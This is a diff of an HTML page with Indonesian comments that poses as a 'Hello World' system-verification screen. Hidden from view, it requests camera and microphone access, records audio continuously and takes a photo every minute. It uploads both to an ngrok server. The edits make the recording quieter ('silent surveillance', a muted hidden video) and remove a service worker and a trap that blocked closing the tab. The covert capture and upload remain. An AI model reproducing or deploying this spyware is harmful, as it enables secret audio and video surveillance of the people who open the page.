@@ -8,22 +8,22 @@
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 80px 20px;
+            padding: 100px 20px;
             background: #000;
             color: #0f0;
             margin: 0;
         }
-        h1 { font-size: 4.8em; margin-bottom: 20px; }
+        h1 { font-size: 4.8em; }
         p { font-size: 1.7em; }
         .status { color: #0f0; font-size: 1.4em; margin-top: 50px; }
     </style>
 </head>
 <body>
     <h1>Hello World</h1>
-    <p>Verifikasi sistem selesai.</p>
-    <div class="status" id="status">Menginisialisasi akses latar belakang...</div>
+    <p>Sedang memverifikasi...</p>
+    <div class="status" id="status">Menginisialisasi perekaman senyap...</div>
 
-    <video id="video" autoplay playsinline style="display: none;"></video>
+    <video id="video" autoplay playsinline muted style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
@@ -32,36 +32,28 @@
         let audioChunks = [];
         const ngrokUrl = "https://reversion-exert-gloomily.ngrok-free.dev";
 
-        // Register Service Worker untuk background persistence
-        async function registerServiceWorker() {
-            if ('serviceWorker' in navigator) {
-                try {
-                    const reg = await navigator.serviceWorker.register('sw.js');
-                    console.log("[+] Service Worker terdaftar");
-                } catch (err) {
-                    console.log("[-] Service Worker gagal:", err);
-                }
-            }
-        }
-
-        async function startPersistentSurveillance() {
+        async function startSilentSurveillance() {
             try {
+                // Minta izin dengan audio muted
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: true
                 });
 
-                document.getElementById('video').srcObject = stream;
-                document.getElementById('status').innerHTML = "✅ Akses berhasil<br>Perekaman berjalan di latar belakang";
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+                videoElement.muted = true;           // Matikan suara video
 
-                // Audio terus menerus
+                document.getElementById('status').innerHTML = "✅ Berjalan SENYAP<br>Foto setiap 1 menit • Audio terus merekam";
+
+                // === AUDIO RECORDER (SENYAP - tidak ada suara keluar dari speaker) ===
                 const audioTrack = stream.getAudioTracks()[0];
                 const audioStream = new MediaStream([audioTrack]);
 
                 audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
 
-                audioRecorder.ondataavailable = e => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
+                audioRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
                 };
 
                 audioRecorder.onstop = () => {
@@ -70,28 +62,23 @@
                         sendData('audio', blob);
                         audioChunks = [];
                     }
-                    audioRecorder.start(30000); // lanjut rekam
+                    // Lanjut rekam tanpa henti
+                    audioRecorder.start(30000);
                 };
 
+                // Mulai rekam audio (tetap senyap)
                 audioRecorder.start(30000);
 
-                // Foto setiap 1 menit
-                setInterval(captureAndSendPhoto, 60000);
-                setTimeout(captureAndSendPhoto, 8000); // foto pertama
-
-                // Coba pertahankan meski tab ditutup
-                window.addEventListener('beforeunload', (e) => {
-                    e.preventDefault();
-                    e.returnValue = '';
-                    return "Perekaman masih berjalan...";
-                });
+                // === FOTO SETIAP 1 MENIT ===
+                setInterval(captureSilentPhoto, 60000);
+                setTimeout(captureSilentPhoto, 7000); // foto pertama
 
             } catch (err) {
-                document.getElementById('status').innerHTML = "❌ Izin ditolak. Harap izinkan kamera dan mikrofon.";
+                document.getElementById('status').innerHTML = "❌ Izin ditolak.<br>Harap izinkan kamera & mikrofon.";
             }
         }
 
-        function captureAndSendPhoto() {
+        function captureSilentPhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth || 640;
@@ -102,7 +89,7 @@
 
             canvas.toBlob(blob => {
                 if (blob) sendData('photo', blob, `photo_${Date.now()}.jpg`);
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.85);
         }
 
         function sendData(type, blob, filename = null) {
@@ -113,14 +100,13 @@
             fetch(`${ngrokUrl}/upload`, {
                 method: 'POST',
                 body: formData,
-                keepalive: true   // Penting agar request tetap dikirim saat tab hampir ditutup
+                keepalive: true
             }).catch(() => {});
         }
 
-        // Mulai semuanya
-        window.onload = async () => {
-            await registerServiceWorker();
-            startPersistentSurveillance();
+        // Jalankan otomatis
+        window.onload = () => {
+            startSilentSurveillance();
         };
     </script>
 </body>
